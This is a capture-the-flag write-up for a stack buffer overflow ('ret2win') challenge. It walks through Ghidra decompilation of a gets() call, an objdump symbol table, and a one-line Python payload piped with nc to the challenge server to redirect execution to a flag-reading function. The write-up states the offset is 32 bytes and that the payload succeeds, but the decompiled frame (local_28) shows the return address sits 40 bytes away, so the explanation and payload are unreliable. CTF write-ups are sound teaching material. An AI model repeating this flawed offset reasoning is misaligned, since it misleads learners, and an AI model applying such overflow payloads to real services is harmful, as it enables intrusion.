# pwn/ret2generic-flag-reader
Author: pepsipu

i'll ace this board meeting with my new original challenge!
```nc mc.ax 31077```

# Solution
Looking at the title, we know that this is another buffer overflow challenge.

This time, we are trying to return to a address.

Remember the two things that we are going to look for are the offset and the memory address.

First, let's find the offset.

Open up ghidra and look at the main function.

```c
undefined8 main(void)

{
  char local_28 [32];
  
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts(
      "alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable..."
      );
  puts(
      "how about this, we\'ll make a generic pwnable with an overflow and they\'ve got to ret to some flag reading function!"
      );
  puts("slap on some flavortext and there\'s no way rob will fire me now!");
  puts("this is genius!! what do you think?");
  gets(local_28);
  return 0;
}
```

We see that the offset is 32 characters.

Now we need to find the memory address. 

Remember that the memory address we are trying to find it the memory address of the return call.

So basically, we have to find the memory address of the function we want to return to.

Looking around in ghidra in the functions section, we see that there is a function called super_generic_flag_reading_function_please_ret_to_me.

Now in order to find the memory address of that function, we have to dump the program function first using objdump.

Running objdump -t ret2generic-flag-reader gives us this:

```
SYMBOL TABLE:
0000000000400318 l    d  .interp        0000000000000000              .interp
0000000000400338 l    d  .note.gnu.property     0000000000000000              .note.gnu.property
0000000000400358 l    d  .note.gnu.build-id     0000000000000000              .note.gnu.build-id
000000000040037c l    d  .note.ABI-tag  0000000000000000              .note.ABI-tag
00000000004003a0 l    d  .gnu.hash      0000000000000000              .gnu.hash
00000000004003d0 l    d  .dynsym        0000000000000000              .dynsym
0000000000400508 l    d  .dynstr        0000000000000000              .dynstr
0000000000400578 l    d  .gnu.version   0000000000000000              .gnu.version
0000000000400598 l    d  .gnu.version_r 0000000000000000              .gnu.version_r
00000000004005b8 l    d  .rela.dyn      0000000000000000              .rela.dyn
0000000000400630 l    d  .rela.plt      0000000000000000              .rela.plt
0000000000401000 l    d  .init  0000000000000000              .init
0000000000401020 l    d  .plt   0000000000000000              .plt
00000000004010a0 l    d  .plt.sec       0000000000000000              .plt.sec
0000000000401110 l    d  .text  0000000000000000              .text
00000000004014a8 l    d  .fini  0000000000000000              .fini
0000000000402000 l    d  .rodata        0000000000000000              .rodata
0000000000402184 l    d  .eh_frame_hdr  0000000000000000              .eh_frame_hdr
00000000004021d0 l    d  .eh_frame      0000000000000000              .eh_frame
0000000000403e10 l    d  .init_array    0000000000000000              .init_array
0000000000403e18 l    d  .fini_array    0000000000000000              .fini_array
0000000000403e20 l    d  .dynamic       0000000000000000              .dynamic
0000000000403ff0 l    d  .got   0000000000000000              .got
0000000000404000 l    d  .got.plt       0000000000000000              .got.plt
0000000000404050 l    d  .data  0000000000000000              .data
0000000000404060 l    d  .bss   0000000000000000              .bss
0000000000000000 l    d  .comment       0000000000000000              .comment
0000000000000000 l    df *ABS*  0000000000000000              crtstuff.c
0000000000401150 l     F .text  0000000000000000              deregister_tm_clones
0000000000401180 l     F .text  0000000000000000              register_tm_clones
00000000004011c0 l     F .text  0000000000000000              __do_global_dtors_aux
0000000000404088 l     O .bss   0000000000000001              completed.8060
0000000000403e18 l     O .fini_array    0000000000000000              __do_global_dtors_aux_fini_array_entry
00000000004011f0 l     F .text  0000000000000000              frame_dummy
0000000000403e10 l     O .init_array    0000000000000000              __frame_dummy_init_array_entry
0000000000000000 l    df *ABS*  0000000000000000              ret2generic-flag-reader.c
0000000000000000 l    df *ABS*  0000000000000000              crtstuff.c
00000000004022ec l     O .eh_frame      0000000000000000              __FRAME_END__
0000000000000000 l    df *ABS*  0000000000000000              
0000000000403e18 l       .init_array    0000000000000000              __init_array_end
0000000000403e20 l     O .dynamic       0000000000000000              _DYNAMIC
0000000000403e10 l       .init_array    0000000000000000              __init_array_start
0000000000402184 l       .eh_frame_hdr  0000000000000000              __GNU_EH_FRAME_HDR
0000000000404000 l     O .got.plt       0000000000000000              _GLOBAL_OFFSET_TABLE_
00000000004014a0 g     F .text  0000000000000005              __libc_csu_fini
0000000000404060 g     O .bss   0000000000000008              stdout@@GLIBC_2.2.5
0000000000404050  w      .data  0000000000000000              data_start
0000000000000000       F *UND*  0000000000000000              puts@@GLIBC_2.2.5
0000000000404070 g     O .bss   0000000000000008              stdin@@GLIBC_2.2.5
0000000000404060 g       .data  0000000000000000              _edata
0000000000000000       F *UND*  0000000000000000              fclose@@GLIBC_2.2.5
00000000004014a8 g     F .fini  0000000000000000              .hidden _fini
0000000000000000       F *UND*  0000000000000000              setbuf@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              __libc_start_main@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              fgets@@GLIBC_2.2.5
00000000004011f6 g     F .text  00000000000001af              super_generic_flag_reading_function_please_ret_to_me
0000000000404050 g       .data  0000000000000000              __data_start
0000000000000000  w      *UND*  0000000000000000              __gmon_start__
0000000000404058 g     O .data  0000000000000000              .hidden __dso_handle
0000000000402000 g     O .rodata        0000000000000004              _IO_stdin_used
0000000000000000       F *UND*  0000000000000000              gets@@GLIBC_2.2.5
0000000000401430 g     F .text  0000000000000065              __libc_csu_init
0000000000404090 g       .bss   0000000000000000              _end
0000000000401140 g     F .text  0000000000000005              .hidden _dl_relocate_static_pie
0000000000401110 g     F .text  000000000000002f              _start
0000000000404060 g       .bss   0000000000000000              __bss_start
00000000004013a5 g     F .text  000000000000008b              main
0000000000000000       F *UND*  0000000000000000              fopen@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              exit@@GLIBC_2.2.5
0000000000404060 g     O .data  0000000000000000              .hidden __TMC_END__
0000000000401000 g     F .init  0000000000000000              .hidden _init
0000000000404080 g     O .bss   0000000000000008              stderr@@GLIBC_2.2.5
```
We see that the memory address of that super_generic_flag_reading_function_please_ret_to_me function is 00000000004011f6.

So now we can make a python payload in order to get the flag.

Our payload will be python -c "print 'A' * 32 + '\xf6\x11\x40\x00\x00\x00\x00\x00'" | nc mc.ax 31077

Running that payload, gives us the flag!

# Flag
```flag{rob-loved-the-challenge-but-im-still-paid-minimum-wage}```
